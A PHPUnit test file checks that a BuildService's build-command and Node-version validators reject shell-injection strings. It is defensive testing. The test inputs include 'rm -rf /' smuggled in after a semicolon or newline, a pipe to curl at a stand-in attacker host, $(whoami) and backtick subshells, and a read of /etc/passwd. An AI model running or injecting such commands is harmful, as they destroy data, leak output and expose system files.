<?php

namespace Tests\Unit;

use App\Services\BuildService;
use Tests\TestCase;

/**
 * Verify that the shell-injection guards in BuildService reject dangerous
 * build commands and Node.js version specifiers before they reach bash -c.
 * Both methods are public on BuildService so no reflection is needed.
 */
class DeployServiceCommandInjectionTest extends TestCase
{
    private BuildService $service;

    protected function setUp(): void
    {
        parent::setUp();
        $this->service = app(BuildService::class);
    }

    private function invoke(string $method, mixed ...$args): mixed
    {
        return $this->service->$method(...$args);
    }

    // ── validateBuildCommand ───────────────────────────────────────────────

    /** @test */
    public function test_build_command_with_semicolon_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateBuildCommand', 'npm run build; rm -rf /');
    }

    /** @test */
    public function test_build_command_with_pipe_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateBuildCommand', 'npm run build | curl http://attacker.com');
    }

    /** @test */
    public function test_build_command_with_backtick_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateBuildCommand', 'npm run build `id`');
    }

    /** @test */
    public function test_build_command_with_dollar_subshell_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateBuildCommand', 'npm run build $(whoami)');
    }

    /** @test */
    public function test_build_command_with_input_redirect_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateBuildCommand', 'npm run build < /etc/passwd');
    }

    /** @test */
    public function test_build_command_with_output_redirect_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateBuildCommand', 'npm run build > /tmp/out');
    }

    /** @test */
    public function test_build_command_with_newline_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateBuildCommand', "npm run build\nrm -rf /");
    }

    /** @test */
    public function test_build_command_double_ampersand_is_allowed(): void
    {
        // && is explicitly permitted (common pattern: "npm install && npm run build")
        $this->invoke('validateBuildCommand', 'npm install && npm run build');
        $this->assertTrue(true); // reached = no exception
    }

    /** @test */
    public function test_valid_build_commands_are_accepted(): void
    {
        $this->invoke('validateBuildCommand', 'npm run build');
        $this->invoke('validateBuildCommand', 'yarn build');
        $this->invoke('validateBuildCommand', 'pnpm install && pnpm build');
        $this->invoke('validateBuildCommand', 'hugo --minify');
        $this->assertTrue(true);
    }

    // ── validateNodeVersion ───────────────────────────────────────────────

    /** @test */
    public function test_node_version_with_semicolon_injection_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateNodeVersion', '18; rm -rf /');
    }

    /** @test */
    public function test_node_version_with_space_injection_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateNodeVersion', '18 && whoami');
    }

    /** @test */
    public function test_node_version_with_backtick_is_rejected(): void
    {
        $this->expectException(\RuntimeException::class);
        $this->invoke('validateNodeVersion', '`id`');
    }

    /** @test */
    public function test_node_version_major_only_is_accepted(): void
    {
        $this->invoke('validateNodeVersion', '20');
        $this->invoke('validateNodeVersion', '18');
        $this->assertTrue(true);
    }

    /** @test */
    public function test_node_version_semver_is_accepted(): void
    {
        $this->invoke('validateNodeVersion', '18.12.1');
        $this->invoke('validateNodeVersion', '20.0.0');
        $this->assertTrue(true);
    }

    /** @test */
    public function test_node_version_lts_alias_is_accepted(): void
    {
        $this->invoke('validateNodeVersion', 'lts/iron');
        $this->invoke('validateNodeVersion', 'lts/hydrogen');
        $this->assertTrue(true);
    }

    /** @test */
    public function test_node_version_named_alias_is_accepted(): void
    {
        $this->invoke('validateNodeVersion', 'current');
        $this->invoke('validateNodeVersion', 'stable');
        $this->assertTrue(true);
    }

    /** @test */
    public function test_empty_node_version_is_accepted(): void
    {
        // Empty string is treated as "use default" — no exception
        $this->invoke('validateNodeVersion', '');
        $this->assertTrue(true);
    }
}
